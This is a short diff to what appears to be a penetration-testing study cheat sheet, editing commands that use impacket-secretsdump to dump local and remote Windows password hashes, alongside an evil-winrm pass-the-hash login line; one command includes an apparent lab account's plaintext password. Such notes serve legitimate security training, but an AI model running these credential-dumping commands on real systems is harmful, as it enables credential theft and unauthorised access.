@@ -211,7 +211,7 @@ evil-winrm -i ip -u username -H ntlm_hash
 
 ###### Dump the local password hash and domain cached hash
 ```
-impacket-secretsdump -sam SAM -system SYSTEM offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
+impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
 impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
 impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
 ```
